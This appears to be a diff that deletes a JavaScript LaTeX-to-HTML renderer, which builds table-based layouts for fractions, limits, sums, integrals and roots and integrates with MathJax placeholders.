-    this.linethick = function(fs)
-    {
-        return Math.floor(fs/30) + 1;
-    }
-    this.recur = function(p, q, fs)
-    { 
-        var s = this.s;
-        this.pos = p;
-        var tt;
-        var k;
-        var a;
-        var buf = '';
-        var newpos = 0;
-        var Z = [];
-         
-        while ((tt=this.literal(q))!=null)
-        {
-            switch(tt)
-            { 
-                case '\\frac':
-                                
-                    if (buf!='') Z[Z.length] = {
-                        x:Math.ceil(fs/2),
-                        y:Math.ceil(fs/2), 
-                        t:this.format(buf,fs)
-                        };                        
-                    buf = '';
-                    u = this.literal(q);
-                    if (u!='{' ) 
-                    { 
-                        Z[Z.length] =  {
-                            x:Math.ceil(fs/2), 
-                            y:Math.ceil(fs/2),
-                            t:this.formate("Missing \"{\"   in " 
-                                + s.substring(this.pos,q))
-                            };
-                        break;
-                    }
-                    k1 = this.pos;
-                    a = this.closeone('{', '}',q);
-                    if (a == null) 
-                    { 
-                        Z[Z.length] =  {
-                            x:Math.ceil(fs/2), 
-                            y:Math.ceil(fs/2),
-                            t:this.formate("Missing \"}\"   in " 
-                                + s.substring(this.pos,q))
-                            };
-                        break;
-                    }
-                    var k2 = this.pos - 1;
-        
-                    a = this.literal(q);
-                    if (a !=  '{') 
-                    { 
-                        Z[Z.length] =   Z[Z.length] =  {
-                            x:Math.ceil(fs/2), 
-                            y:Math.ceil(fs/2),
-                            t:this.formate("Missing \"{\"   in "
-                                + s.substring(this.pos,q))
-                            };
-                        break;
-                    }
-                    var k3 = this.pos;
-                    a = this.closeone('{', '}',q);
-                    if (a == null) 
-                    {    
-                        Z[Z.length] =  {
-                            x:Math.ceil(fs/2), 
-                            y:Math.ceil(fs/2),
-                            t:this.formate("Missing \"{\"   in " 
-                                + s.substring(this.pos,q))
-                            };
-                        break;
-                    }
-                    k4 = this.pos - 1;
-                    newpos = this.pos;
-                    var num  =this.recur(k1,k2, fs);
-                    var x = num.x + num.y;
-                    var den = this.recur(k3,k4, fs);
-                    var y = den.x + den.y;
-                    var lk = this.linethick(fs);
-                    var t = "<table style=display:inline cellpadding=0 cellspacing=0 ><tr height=" + x +"><td align=center>" + num.t 
-                    + "</td></tr><tr height=" + lk +"><td><div style=\"width:100%;background-color:"
-                    + this.color +";height:" + lk +"px\"><!-- --></td></tr><tr><td><tr height=" + y +"><td  align=center>" + den.t +"</td></tr></table>";
-                    Z[Z.length] = {
-                        x:x, 
-                        y:y, 
-                        t:t
-                    };
-                    this.pos = newpos;
-                    break;
-                case '\\lim':
-                    if (buf!='') Z[Z.length] = {
-                        x:Math.ceil(fs/2),
-                        y:Math.ceil(fs/2), 
-                        t:this.format(buf,fs)
-                        };                        
-                    buf = '';
-                    newpos = this.pos;
-                    var n = this.literal(q);
-                    if (n!='_' ) 
-                    {
-                        Z[Z.length] = {
-                            x:Math.ceil(fs/2), 
-                            y:Math.ceil(fs/2),
-                            t:this.formatl('lim',fs)
-                            };
-                        this.pos = newpos;
-                        break;
-                    }
-        
-                    a = this.literal(q);
-                    k1 = this.pos;
-                    if (a != "{" ) 
-                    { 
-                        Z[Z.length] = {
-                            x:Math.ceil(fs/2), 
-                            y:Math.ceil(fs/2),
-                            t:this.formate("Missing \"{\"   in " 
-                                + s.substring(newpos,q) )
-                            };
-                        break;
-                    }
-        
-                    a = this.closeone("{", "}",q);
-                    k2 = this.pos -1 ;
-                    if (a == null) 
-                    {  
-                        Z[Z.length] =  {
-                            x:Math.ceil(fs/2), 
-                            y:Math.ceil(fs/2),
-                            t:this.formate("Missing \"}\"   in "
-                                + s.substring(newpos,q))
-                            };
-                        break;
-                    }
-         
-                    newpos = this.pos;
-                                
-                    num  =this.recur(k1,k2,Math.ceil(fs/2));
-                    x = num.x + num.y;
-      
-                    t = "<table style=display:inline cellpadding=0 cellspacing=0><tr height=" + fs +"><td align=center>"  + this.formatl('lim', fs) 
-                    + "</td></tr><tr height=" +  x +"><td  align=center >" + num.t +"</td></tr></table>";
-                    y = Math.round(fs/2 + x);
-                    x = Math.round(fs/2);
-                    Z[Z.length] = {
-                        x:x, 
-                        y:y, 
-                        t:t
-                    };
-                    this.pos = newpos;
-                    break;    
-                case '\\sum': case '\\prod':
-                                    
-                    if (buf!='') Z[Z.length] ={
-                        x:Math.ceil(fs/2),
-                        y:Math.ceil(fs/2), 
-                        t:this.format(buf,fs)
-                        };                       
-                    buf = '';
-                    newpos = this.pos;
-                    var u = this.literal(q);
-        
-                    if ( u!='_' && u!='^') 
-                    {
-                        this.pos = newpos;
-                        break;
-                    }
-                    else
-                    { 
-                        k1 = this.pos;
-                        a = this.literal(q);
-                        if (a == '{')
-                        {
-                            k1 = this.pos;
-                            a = this.closeone("{", "}",q);
-                            k2 = this.pos - 1;
-                            if (a == null) 
-                            {
-                                Z[Z.length] = {
-                                    x:Math.ceil(fs/2), 
-                                    y:Math.ceil(fs/2),
-                                    t:this.formate("Missing \"}\"   in "
-                                        + s.substring(k1,q))
-                                    };
-                                break;
-                            }
-                        }
-                        else
-                        {
-                            k2 = this.pos;
-                        }
-                        var v = this.literal(q);
-                        if (v!='_' && v!='^') 
-                        {
-                            newpos = this.pos;
-                                            
-                            num  =this.recur(k1,k2,Math.ceil( fs/2));
-                            var x = num.x + num.y;
-                            if (u =='_')
-                            {
-                                t = "<table style=display:inline cellpadding=0 cellspacing=0><tr height=" + fs +"><td>" + this.formatl(tt,fs) 
-                                + "</td></tr><tr height=" + x +"><td>" + num.t +"</td></tr></table>";
-                                y = Math.round(fs/2 + x);
-                                x = Math.round(fs/2);
-                            }
-                            else
-                            {
-                                t = "<table style=display:inline cellpadding=0 cellspacing=0><tr height=" + x +"><td  align=center >" + num.t +"</td></tr><tr height=" + fs +"><td  align=center >" +  this.formatl(tt,fs) 
-                                + "</td></tr></table>"; 
-                                x = Math.round(fs/2 + x);
-                                y = Math.round(fs/2);
-                            }
-                            Z[Z.length] = {
-                                x:x, 
-                                y:y, 
-                                t:t
-                            };
-                            this.pos = newpos;
-                            break;
-                        }
-                        else
-                        { 
-                            k3 = this.pos;
-                            a = this.literal(q);
-                            if (a == '{')
-                            {
-                                k3 = this.pos;
-                                a = this.closeone("{", "}",q);
-                                k4 = this.pos - 1;
-                                if (a == null) 
-                                {
-                                    Z[Z.length] = {
-                                        x:Math.ceil(fs/2), 
-                                        y:Math.ceil(fs/2),
-                                        t:"<span style=\"color:" + this.wcolor +";font-size:" + this.fs +"px\">Missing \"}\" in " 
-                                        + s.substring(k3,q) +"</span>"
-                                        };
-                                    break;
-                                }
-                                                
-                            }
-                            else
-                            {
-                                k4 = this.pos;
-                                                
-                            }
-                            newpos = this.pos;
-                            if (u =='^')
-                            {
-                                                
-                                num  =this.recur(k1,k2,Math.ceil(fs/2));
-                                var z  =this.recur(k3,k4,Math.ceil(fs/2));
-                            }
-                            else
-                            {
-                                                
-                                num  =this.recur(k3,k4,Math.ceil( fs/2));
-                                z  =this.recur(k1,k2,Math.ceil( fs/2));
-                            }
-             
-                            x = num.x + num.y;
-             
-                            y = z.x + z.y;
-                                       
-                            tt =this.subs(tt);
-                            t = "<table style=display:inline cellpadding=0 cellspacing=0><tr height=" + x +"><td  align=center >" + num.t +"</td></tr>"
-                            +"<tr height=" + fs +"><td  align=center >"  +  this.formatl(tt,fs) 
-                            + "</td></tr><tr height=" + y +"><td  align=center >" + z.t +"</td></tr></table>";
-                            x = Math.round(fs/2 + x);
-                            y = Math.round(fs/2 + y);
-            
-                            Z[Z.length] = {
-                                x:x, 
-                                y:y, 
-                                t:t
-                            };
-                            this.pos = newpos; 
-                            break;
-                        }
-                    }
-        
-         
-                    break;
-                                    
-                case '\\int': case '\\oint':
-                                    
-                    if (buf!='') Z[Z.length] ={
-                        x:Math.ceil(fs/2),
-                        y:Math.ceil(fs/2), 
-                        t:this.format(buf,fs)
-                        };                       
-                    buf = '';
-                    newpos = this.pos;
-                    u = this.literal(q);
-        
-                    if ( u!='_' && u!='^') 
-                    {
-                        this.pos = newpos;
-                        break;
-                    }
-                    else
-                    { 
-                        k1 = this.pos;
-                        a = this.literal(q);
-                        if (a == '{')
-                        {
-                            k1 = this.pos;
-                            a = this.closeone("{", "}",q);
-                            k2 = this.pos - 1;
-                            if (a == null) 
-                            {
-                                Z[Z.length] = {
-                                    x:Math.ceil(fs/2), 
-                                    y:Math.ceil(fs/2),
-                                    t:this.formate("Missing \"}\"   in "
-                                        + s.substring(k1,q))
-                                    };
-                                break;
-                            }
-                        }
-                        else
-                        {
-                            k2 = this.pos;
-                        }
-                        var v = this.literal(q);
-                        if (v!='_' && v!='^') 
-                        {
-                            newpos = this.pos;
-                                            
-                            num  =this.recur(k1,k2,Math.ceil( fs/2));
-                            x = num.x + num.y;
-                            tt = this.subs(tt);
-                            if (u =='_')
-                            {
-                                t = "<table style=display:inline cellpadding=0 cellspacing=0 border=1><tr height=" + x +"><td rowspan=3 valign=middle width=" + Math.ceil(fs/2) +">" + this.formatl(tt,fs+x) 
-                                + "</td><td><!----></td></tr><tr height=" + fs +"><td><!-- --></td></tr><tr height=" + x +"><td>" + num.t +"</td></tr></table>";
-                                y = Math.round(fs/2 + x);
-                                x = Math.round(fs/2 + x);
-                            }
-                            else
-                            {
-                                t = "<table style=display:inline cellpadding=0 cellspacing=0><tr height=" + x +"><td rowspan=3 valign=middle>" + this.formatl(tt,fs+x) 
-                                + "</td><td>" + num.t +"</td></tr><tr height=" +  fs +"><td><!-- --></td></tr><tr height=" + x +"><td><!----></td></tr></table>";
-                                x = Math.round(fs/2 + x);
-                                y = Math.round(fs/2 + x);
-                            }
-                            Z[Z.length] = {
-                                x:x, 
-                                y:y, 
-                                t:t
-                            };
-                            this.pos = newpos;
-                            break;
-                        }
-                        else
-                        { 
-                            k3 = this.pos;
-                            a = this.literal(q);
-                            if (a == '{')
-                            {
-                                k3 = this.pos;
-                                a = this.closeone("{", "}",q);
-                                var k4 = this.pos - 1;
-                                if (a == null) 
-                                {
-                                    Z[Z.length] = {
-                                        x:Math.ceil(fs/2), 
-                                        y:Math.ceil(fs/2),
-                                        t:this.formate("Missing \"}\" in " 
-                                            + s.substring(k3,q))
-                                        };
-                                    break;
-                                }
-                                                
-                            }
-                            else
-                            {
-                                k4 = this.pos;
-                                                
-                            }
-                            newpos = this.pos;
-                            if (u =='^')
-                            {
-                                                
-                                num  =this.recur(k1,k2,Math.ceil(fs/2));
-                                z  =this.recur(k3,k4,Math.ceil(fs/2));
-                            }
-                            else
-                            {
-                                                
-                                num  =this.recur(k3,k4,Math.ceil( fs/2));
-                                z  =this.recur(k1,k2,Math.ceil( fs/2));
-                            }
-             
-                            x = num.x + num.y;
-             
-                            y = z.x + z.y;
-                                            
-                            tt = this.subs(tt);
-                                            
-                            t = "<table style=display:inline cellpadding=0 cellspacing=0 border=0>"
-                            + "<tr height=" + x +"><td rowspan=3 valign=middle >"   +  this.formatthin(tt,x+y+fs) + "</td>"
-                            + "<td>"   + num.t +"</td></tr>"
-                            + "<tr height=" + fs+"><td><!-- --></td></tr>"
-                            + "<tr height="  + y +"><td  align=center >"  
-                            + z.t  + "</td></tr></table>";
-                            x = Math.round(fs/2 + x);
-                            y = Math.round(fs/2 + y);
-            
-                            Z[Z.length] = {
-                                x:x, 
-                                y:y, 
-                                t:t
-                            };
-                            this.pos = newpos; 
-                            break;
-                        }
-                    }
-        
-         
-                    break;
-                case '\\left(': case '\\left[':  case '\\left{':
-                                    
-                    if (buf!='') Z[Z.length] ={
-                        x:Math.ceil(fs/2),
-                        y:Math.ceil(fs/2), 
-                        t:this.format(buf,fs)
-                        };                       
-                    buf = '';
-                    k1 = this.pos;
-                    var closed = "\\right" + String.fromCharCode(2+tt.charCodeAt(5));
-                    if (tt.charAt(5) == '(')
-                        closed = "\\right" + String.fromCharCode(1+tt.charCodeAt(5));
-                                    
-                    u = this.closeone(tt,closed,q);
-                                     
-                    if ( u == null) 
-                    {
-                        Z[Z.length] = {
-                            x:Math.ceil(fs/2), 
-                            y:Math.ceil(fs/2),
-                            t:this.formate("Missing the closing \"" + closed +"\"   in "
-                                + s.substring(newpos,q))
-                            };
-                        break;
-                    }
-                    else
-                    { 
-                        k2 = this.pos - 7;
-                        newpos = this.pos;
-                        num  =this.recur(k1,k2, fs);
-                        x = num.x + num.y;
-                        t = "<table style=display:inline cellpadding=0 cellspacing=0 border=0>"
-                        + "<tr height=" + x +"><td>"   +  this.formatthin(tt.charAt(5),x) + "</td>"
-                        + "<td>"   + num.t +"</td>"
-                        + "<td>"   +  this.formatthin(closed.charAt(6),x) 
-                        + "</td></tr></table>";
-                        x = Math.round(x/2);
-                        y = Math.round(x/2);
-                        Z[Z.length] = {
-                            x:x, 
-                            y:y, 
-                            t:t
-                        };
-                        this.pos = newpos; 
-                        break; 
-                    }
-        
-         
-                    break;
-                case '^': case '_':
-                                    
-                    if (buf!='') Z[Z.length] ={
-                        x:Math.ceil(fs/2),
-                        y:Math.ceil(fs/2), 
-                        t:this.format(buf,fs)
-                        };                       
-                    buf = '';
-                    k1 = this.pos;
-                    a = this.literal(q);
-                    if (a == '{')
-                    {
-                        k1 = this.pos;
-                        a = this.closeone("{", "}",q);
-                        k2 = this.pos - 1;
-                        if (a == null) 
-                        {
-                            Z[Z.length] = {
-                                x:Math.ceil(fs/2), 
-                                y:Math.ceil(fs/2),
-                                t:this.formate("Missing \"}\"   in "
-                                    + s.substring(k1,q))
-                                };
-                            break;
-                        }
-                    }
-                    else
-                    {
-                        k2 = this.pos;
-                    }
-                    newpos = this.pos;
-                    num  =this.recur(k1,k2,Math.ceil( fs/2));
-                  
-                    if (tt =='^')
-                    {
-                        var w = Z[Z.length-1];
-                         
-                        t = "<table style=display:inline cellpadding=0 cellspacing=0 border=0>"
-                        +   "<tr height=" + num.x +"><td style=\"font-size:" + (num.x-3) + "px\"><!-- --></td><td rowspan=2 valign=top align=left>" + num.t +"</td></tr>" 
-                        +"<tr><td valign=center align=right>" + w.t + "</td></tr></table>";
-                        y = Math.max(w.y, num.y-w.x);
-                        x = w.x + num.x;
-                        Z[Z.length-1] = {
-                            x:x, 
-                            y:y, 
-                            t:t
-                        };
-                    }
-                    else
-                    {
-                        w = Z[Z.length-1];
-                         
-                        t = "<table style=display:inline cellpadding=0 cellspacing=0 border=0>"
-                        + "<tr ><td  valign=center  align=right>" + w.t +"</td><td rowspan=2 valign=bottom  align=left>" + num.t +"</td></tr>"
-                        + "<tr height=" + num.y + "><td style=\"font-size:" + (num.y-3) + "px\"><!-- --></td></tr></table>";
-                        x = Math.max(w.x, num.x-w.y);
-                        y = w.y + num.y;
-                        Z[Z.length-1] = {
-                            x:x, 
-                            y:y, 
-                            t:t
-                        };
-                    }
-                    this.pos = newpos;                   
-                    break;  
-    
-                case "{" :
-                    if (buf!='') Z[Z.length] ={
-                        x:Math.ceil(fs/2),
-                        y:Math.ceil(fs/2), 
-                        t:this.format(buf,fs)
-                        };                       
-                    buf = '';
-                    k1 = this.pos;
-                    a = this.closeone("{", "}", q);
-                    if (a == null)
-                    { 
-                        Z[Z.length] = {
-                            x:Math.ceil(fs/2), 
-                            y:Math.ceil(fs/2),
-                            t:this.formate("Missing \"}\"   in "
-                                + s.substring(k1,q))
-                            };
-                        break;
-                         
-                    }
-                    newpos = this.pos;
-                    Z[Z.length] = this.recur(k1, this.pos-1, fs);
-                    this.pos = newpos;
-                    break;
-      
-                case "\\bar":
-                    num = this.recur(this.pos, q, fs);
-                    lk = this.linethick(fs);
-                    t = "<table style=display:inline cellspacing=0 cellpadding=0><tr height=" 
-                    +  lk + "><td><div style=\"background-color:" + this.color +";height:" 
-                    + lk +"px;width:100%\"><!-- --></div></td></tr>" 
-                    + "<tr><td>" + num.t + "</td></tr></table>"; 
-                    x = num.x+ Math.floor(lk/2);
-                    y = num.y+ Math.floor(lk/2);
-                    Z[Z.length] = {
-                        x:x, 
-                        y:y, 
-                        t:t
-                    };
-                    this.pos = q;
-                    break;
-
-                case "\\hat": case "\\hat":
-
-                    num = this.recur(this.pos, q, fs);
-                    tt = this.subs(tt);
-                    t = "<table style=display:inline cellspacing=0 cellpadding=0><tr height=" 
-                    +  Math.round(fs/2) 
-                    + "><td align=center>" 
-                    + this.format(tt,Math.round(fs/2)) 
-                    +"</td></tr>" 
-                    + "<tr><td>" + num.t + "</td></tr></table>"; 
-                    x = num.x+ Math.floor(fs/3);
-                    y = num.y;
-                    Z[Z.length] = {
-                        x:x, 
-                        y:y, 
-                        t:t
-                    };
-                    this.pos = q;
-                    break;
-
-                case "\\sqrt" :
-
-                    if (buf!='') Z[Z.length] ={
-                        x:Math.ceil(fs/2),
-                        y:Math.ceil(fs/2), 
-                        t:this.format(buf,fs)
-                        };                       
-                    buf = '';
-                    a = this.literal(q);
-                    var  k1 = this.pos;
-                    if (a != '{')
-                    {
-                        Z[Z.length] = {
-                            x:Math.ceil(fs/2), 
-                            y:Math.ceil(fs/2),
-                            t:this.formate("Missing \"{\"   in " + s.substring(k1,q))
-                            };
-                        break;
-                    }
-    
-                    a = this.closeone("{", "}",q);
-                    k2 = this.pos - 1;
-                    newpos = this.pos;
-                    num = this.recur(k1, k2, fs);
-                    lk = this.linethick(fs);
-                    tt = this.subs(tt);
-                    t = "<table style=display:inline cellspacing=0 cellpadding=0><tr height=" +  lk + "><td rowspan=2>" + this.format(tt,(num.x + num.y+2) ) + "</td><td><div style=\"background-color:" + this.color +";height:" + lk +"px;width:100%\"><!-- --></div></td></tr>" 
-                    + "<tr><td>" + num.t + "</td></tr></table>"; 
-                    x = num.x+ Math.floor(lk/2);
-                    y = num.y+ Math.floor(lk/2);
-                    Z[Z.length] = {
-                        x:x, 
-                        y:y, 
-                        t:t
-                    };
-                    this.pos = newpos;
-                    break;  
-       
-                case  "\\arcsin":  case "\\arctan":  case"\\arg" :  case"\\cos" :  case"\\cosh"   :  case"\\cot" 	 :  case"\\coth"    :  
-                case"\\csc" 	  :  case"\\deg" :  case"\\det"
-                :  case"\\dim" :  case"\\exp" 	    :  case"\\gcd" :  case"\\hom" :  case"\\inf" :  case"\\ker" :  case"\\lg" :  
-                case"\\liminf" :  case"\\limsup" :  case"\\ln" 
-                :  case"\\log" :  case"\\max" :  case"\\min" :  case"\\sec" :  case"\\sin" :  case"\\sinh" :  case"\\sup" :  
-                case"\\tan" :  case"\\tanh":
-                    Z[Z.length] = {
-                        x:Math.round(fs/2), 
-                        y:Math.round(fs/2), 
-                        t:this.formatl(tt.substring(1), fs)
-                        };
-                    break;
-                default:
-                                    
-                    tt = this.subs(tt);
-                    if (tt.indexOf("\\") > 0)
-                        buf +=   tt +" ";
-                    else
-                        buf += tt;
-                                    
-                    break;
-           
-            }
-                             
-                             
-        }
-        if (buf!='') Z[Z.length] ={
-            x:Math.ceil(fs/2),
-            y:Math.ceil(fs/2), 
-            t:this.format(buf,fs)
-            };           
-        buf = '';
-        var mx = 0; 
-        var my = 0;
-    
-        for (var i=0; i < Z.length; i++)
-        {
-            if (Z[i].x > mx) mx = Z[i].x;
-            if (Z[i].y > my) my = Z[i].y;
-        }
-        t = '<table style=display:inline cellspacing=0 cellpadding=0 border=0><tr>';
-        lk = this.linethick(fs)*3;
-        for ( i=0; i < Z.length; i++)
-        {
-                                
-            t += "<td style=width:" + lk + "px><!-- --></td><td><table style=display:inline cellspacing=0 cellpadding=0  border=0>";
-            if (mx > Z[i].x)
-                t += "<tr height=" + (mx-Z[i].x) +"><td   > <!-- --></td></tr>";
-            t += "<tr height=" + (Z[i].y+Z[i].x) +"><td valign=middle>" + Z[i].t +"</td></tr>";
-            if (my > Z[i].y)
-                t += "<tr height=" + (my-Z[i].y) +"><td  > <!-- --></td></tr>";    
-            t += "</table></td>";
-                             
-        } 
-        t +="</tr></table>";
-        return {
-            x:mx, 
-            y:my, 
-            t:t
-        };
-    }
- 
-}
-
-function latex2html1(s,  color, fs)
-{
-    var ans = '';
-    var k = -1;
-    while (k < s.length)
-    {
-        var l = s.indexOf("$", k+1);
-        if (l == -1) 
-        {
-            ans += s.substring(k+1);
-            break;
-        }
-        if (l>0 && s.charAt(l-1) == '\\') 
-        {
-            ans += s.substring(k+1,l-1) + "$";
-            k = l;
-            continue;
-        }
-        ans += "<font color=" + color + ">" + s.substring(k+1,l) + "</font>";
-       
-        k = s.indexOf("$",l+1);
-        while (k>0 && s.charAt(k-1) == '\\')
-        {
-           k = s.indexOf("$",k+1);
-        }
-        if (k < 0)
-        {
-            k = s.length;
-        }
-        var y = s.substring(l+1,k);
-        
-        ans +=  latex2html(y,  color, fs) ;
-    }
-    
-   
-    return ans;
-}
-
-function latex2html(s,  color, fs)
-{ 
-    var x = new Trans(s,fs, color)
-    var y = x.recur(0, s.length, fs);
-    
-    return y.t;
-}
-function myformatele(v)
-{
-    if (v==null) return;
-    var s = v.innerHTML;
-    
-    if (s!=null || s == '')
-        s = myformatele1(s);
-    
-    v.innerHTML = s;
-}
-function myformatele1(s,ratio)
-{
-    var st = 0;
-    var ss = '';
-    var did = false;
-    var buf='';
-    for (var i=0; i < s.length; i++)
-    {
-        var c = s.charAt(i);
-        if (c == '$')
-        {
-            if (st == 0)
-                st = 1;
-            else if (st == 1)
-            {
-                st = 5;
-                buf = '';
-            }
-            else if (st == 2)
-            {
-                if (did==false)
-                   ss += latex2html(buf, 'black', 30*ratio);
-                else 
-                    ss += '\$...\$'; 
-                st = 0;
-                did=true;
-            }
-            else if (st ==5)
-            {
-                if (did==false)
-                    ss += latex2html(buf, 'red', 20*ratio);
-                else 
-                    ss += '\$\$...\$\$';
-                st = 6;
-            }
-            else if (st == 6)
-            {
-                st = 0;
-            }
-        }
-        else
-        {
-            if (st == 0)
-            {
-                ss += c;
-            }
-            else if (st == 1)
-            {
-                st = 2;
-                buf = c;
-            }
-            else if (st == 2 || st == 5)
-            {
-                buf += c;
-            } 
-        }
-    }
-    return ss;
-}
-//var s = "\\sqrt{(a+b)^2}  xy  \\frac{x}{1+ \\frac{x}{1+ \\frac{x}{y}} } \\lim_{x \\to 0}f(x) \\prod_{n=1}^23 a(i)  \\oint_0^\\pi f(x)dx";
-//document.write(latex2html(s, 'red', 20) );
-var LaTexHTML =
-{
-    states : 
-    [
-    [6,1,0],
-    [3,2,3],
-    [4,5,4],
-    [3,0,3],
-    [4,5,4],
-    [4,0,4],
-    [0,0,0] 
-     
-    ],
-    ei : 0,
-    SI : 20,
-    DI : 20,
-    fid : '',
-    assignedid:false,
-    jj : 0,
-    sav : '',
-    dav : '',
-    pn : ",div,span,p,body,li,td,h1,h2,h3,h4,h5,th,dt,th,form,a,font,b,nobr,strong,i,em,", 
-    r : null, 
-    formatele : function (dv)
-    {
-       if (dv == null  )  return;
-       
-       var p = "," + dv.parentNode.nodeName.toLowerCase() + ',';
-       if (dv.nodeName.toLowerCase() == '#text' && LaTexHTML.pn.indexOf(p) >=0)
-       {
-           var x = dv.nodeValue;
-           if (x.indexOf("$")>=0)
-           {
-                LaTexHTML.format(x,dv.parentNode,dv);  
-                dv.parentNode.removeChild(dv);
-           }
-           return;
-       }
-         
-       var N = dv.childNodes.length;
-       if (N == 0) return;
-       for (var i=N-1; i >=0; i--)
-          LaTexHTML.formatele(dv.childNodes[i]); 
-    },
-    
-    format : function (t,dv,zz) 
-    {
-        LaTexHTML.initid();
-        if (dv == null)
-        {
-            dv = document.createElement("div");
-        }
-       
-        var state = 0;
-        var buf = '';
-        var code;
-        for (var i=0; i < t.length; i++)
-        {
-           if (t.charAt(i) == '\\') code = 0;
-           else if (t.charAt(i) == '$') code = 1;
-           else code = 2;
- 
-           if ( code == 2 || (state > 0 && state<=6) && code  == 0)
-           {
-              if (state == 6) buf += "\\";
-              buf += t.charAt(i);
-           }
-           else if (code == 1)
-           {
-               if ( state == 0)
-               {
-                   
-                  var x = document.createTextNode(buf);
-                  if (buf!='')
-                  {
-                      if (zz == null)
-                      dv.appendChild(x);
-                      else
-                      dv.insertBefore(x,zz);
-                  }
-               }
-               else if ( state == 3)
-               {
-                  var si = LaTexHTML.nexts();
-                  if (si!=null)
-                  {
-                      var x = document.getElementById("S__s" +  si);
-
-                      if (x!= null)
-                      {
-                         if (zz ==null)
-                          dv.appendChild(x);
-                         else
-                          dv.insertBefore(x,zz);
-                          var math = LaTexHTML.next(x);
-                          if (math!=null)
-                              MathJax.Hub.queue.Push(["Text",math,"\\displaystyle{"+ buf + "}"] );
-
-                      }
-                  }
-                  
-               }
-               else if ( state == 5)
-               {
-                  var di = LaTexHTML.nextd();
-                  if (di!=null)
-                  {
-                      var x = document.getElementById("D__d" +  di);
-
-                      if (x!=null)
-                      {
-                          if (zz == null)
-                          dv.appendChild(x);
-                          else
-                          dv.insertBefore(x,zz);
-                          var math = LaTexHTML.next(x);
-                          if (math!=null)
-                              MathJax.Hub.queue.Push(["Text",math,"\\displaystyle{"+ buf + "}"] );
-
-                      }
-                  }
-                  
-               }
-               else if (state == 6)
-               {
-                  buf += '$';
-               }
-               if (state == 5 || state < 4) buf = '';
-           }
-           
-           state = LaTexHTML.states[state][code];
-
-        }
-        if (buf!='')
-        {
-              var x = document.createTextNode(buf);
-              if (zz == null)
-              dv.appendChild(x);
-              else
-              dv.insertBefore(x,zz);
-        } 
-       
-    },
-    deformat :  function (dv)
-    {
-       if (dv == null || dv.nodeName.toLowerCase() == '#text' )  return;
-       
-       var d =  dv.nodeName.toLowerCase() ;
-       if (d  == 'span' && dv.id.indexOf("S__s") == 0 || d  == 'div' && dv.id.indexOf("D__d") == 0)
-       {
-          var y = document.createTextNode("XXX");
-          dv.parentNode.insertBefore(y,dv);
-          var ans = LaTexHTML.del(dv);
-          var z = '$'; if (d == 'div') z+='$';
-          y.nodeValue = z + ans + z;
-          return; 
-       }  
-       var N = dv.childNodes.length;
-       if (N == 0) return;
-       for (var i=N-1; i >=0; i--)
-          LaTexHTML.deformat(dv.childNodes[i]); 
-    },
-    reformat : function(dv)
-    {
-        LaTexHTML.deformat(dv);
-        LaTexHTML.formatele(dv);
-    },
-    getId : function(e)
-    {
-       if (e == null || typeof(e.innerHTML) == 'undefined')
-           return null;
-       var s = e.innerHTML;
-       var i  = s.indexOf(LaTexHTML.fid);
-       var j  = i + LaTexHTML.fid.length;
-       while (true)
-       {
-           var c = s.charAt(j);
-           if (c < '0' || c > '9') break;
-           else j++;
-       }  
-       return s.substring(i,j);
-    },
-    next : function(e)
-    {
-       var id = LaTexHTML.getId(e);
-       if (id == null || typeof(MathJax) == 'undefined') return null;
-       var maths = MathJax.Hub.getAllJax('MathOutput');
-       for (var j=0; j < maths.length; j++)
-       {  
-           if( maths[j].inputID  == id  )
-           {  
-               
-               return maths[j];
-           }
-        }
-        return null;
-    },
-     
-    del : function(e)
-    {
-       var ans = '';
-       var id = LaTexHTML.getId(e);
-       if (id == null) return;
-       var maths = MathJax.Hub.getAllJax('MathOutput');
-       for (var j=0; j < maths.length; j++)
-       {  
-         
-           if( maths[j].inputID == id)
-           {
-               ans = maths[j].SourceElement().innerHTML.replace(/^[^{]+{/,'').replace(/}$/,'');
-               MathJax.Hub.queue.Push(["Text",maths[j],"{}"] );
-               break;
-           }
-       } 
-      //document.body.insertBefore(e, document.getElementById("D__d")); 
-      document.getElementById('sdhost').insertBefore(e, document.getElementById("D__d")); 
-       var eid = e.id;
-       if (eid.indexOf("S__s") == 0)
-       {
-          LaTexHTML.sav += eid.replace(/S__s/,'')  + ",";
-       }
-       else
-       {
-          LaTexHTML.dav += eid.replace(/D__d/,'')  + ",";
-       }
-       return ans;
-    }, 
-     
-    initid : function()
-    {
-        if (LaTexHTML.assignedid || typeof(MathJax) == 'undefined') return;
-        var maths = MathJax.Hub.getAllJax('MathOutput');
-        LaTexHTML.ei = 0;
-        for (var j=0; j < maths.length; j++)
-        {  
-            if( maths[j].SourceElement().innerHTML.replace(/[\r|\n| ]/g,'') != '{}')
-            {  
-                LaTexHTML.ei++;
-            }
-        }
-        if (LaTexHTML.ei < maths.length)
-        {
-            LaTexHTML.fid = maths[LaTexHTML.ei].inputID.replace(/[0-9]+/,''); 
-            LaTexHTML.r = new RegExp(".*(" + LaTexHTML.fid + "[0-9]+).*", "i");
-            LaTexHTML.assignedid = true;
-        }
-        else
-        {
-            
-        }
-    },
-     
-    
-    reset : function()
-    {
-         
-        for (var i=0; i < LaTexHTML.SI; i++)
-        {
-            if ( ("," + LaTexHTML.sav).indexOf("," + i +",") < 0)  
-            LaTexHTML.del(document.getElementById("S__s" + i));
-        }
-        for (  i=0; i < LaTexHTML.DI; i++)
-        {
-            if ( ("," + LaTexHTML.dav).indexOf("," + i +",") < 0)  
-            LaTexHTML.del(document.getElementById("D__d" + i));
-        }
-        
-    },
-    
-    init : function(sdn)
-    {  
-      
-        var i = null, j=null;
-        if (sdn!=null && sdn[0]!=null && isNaN(sdn[0])==false)
-            i = parseInt(sdn[0]);
-        if (sdn!=null && sdn[1]!=null && isNaN(sdn[1])==false)
-            j = parseInt(sdn[1]);
-        if (i == null && j == null) return;
-        if (j!=null)LaTexHTML.DI = j;
-        if (i!=null)LaTexHTML.SI = i;
-        document.write("<div id=sdhost style=\"height:1px;overflow:hidden;\">");
-        //document.write("<div style=\"width:200px;height:30px;overflow:hidden\">");
-        for (var i=0; i < LaTexHTML.SI; i++)
-        {
-           document.write("<span id=\"S__s" + i +"\" style=\"border:0px 0px 0px 0px !important\">${}$</span><br>");
-           LaTexHTML.sav += i + ",";
-        }
-        for (i=0; i < LaTexHTML.DI ; i++) 
-        {
-            document.write("<div id=\"D__d" + i +"\"  style=\"border:0px 0px 0px 0px !important\">$${}$$</div>");
-            LaTexHTML.dav += i + ",";
-        }
-        document.write("<div id=\"D__d\"  style=\"border:0px 0px 0px 0px !important\"> </div>");
-        document.write("</div>");
-        //document.write("<span id=\"S__s\" style=\"border:1px blue solid\">\\({}\\)</span>");
